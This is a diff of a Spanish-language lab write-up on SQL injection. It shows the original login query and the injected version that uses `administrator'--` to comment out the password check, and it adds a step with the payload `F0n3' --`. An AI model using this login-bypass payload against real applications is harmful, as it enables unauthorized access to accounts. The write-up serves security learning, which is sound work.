@@ -15,24 +15,30 @@ To solve the lab, perform a SQL injection attack that logs in to the application
 - En este laboratiorio ya nos dan el nombre del **user** `administrator`, pero no tenemos el **password**.
 - El truco está en comentar todo lo que está después del **user** para brincar la condición del **password**.
 
-### Query original:
+#### Query original:
 
 ````sql
-select id,username,subscription from users where username = 'administrator' and password = 'p@ssw0rd123-1';
+select id,username,subscription from users where username = 'administrator' and password = '@variable';
 ````
 
-### Query inyectada:
+#### Query inyectada:
 
 ````sql
-select id,username,subscription from users where username = 'administrator'--' and password = 'p@ssw0rd123-1';
+select id,username,subscription from users where username = 'administrator'--' and password = '@variable';
 ````
 
 ---
 
 ### Explicación con Lab:
 
-1. Hago exactamente el mismo queary pero adaptado con un `username` de mi base de datos
+1. Hago exactamente el mismo queary pero adaptado con un `username` de mi base de datos.
+- Esto arroja un solo resultado, como está planeado originalmente:
 
+````sql
+select id,username,subscription from users where username = 'F0n3' and password = 'p@ssw0rd123-1';
+````
+
+2. Si agrego el payload `F0n3' --` ya no importa 
 
 
 
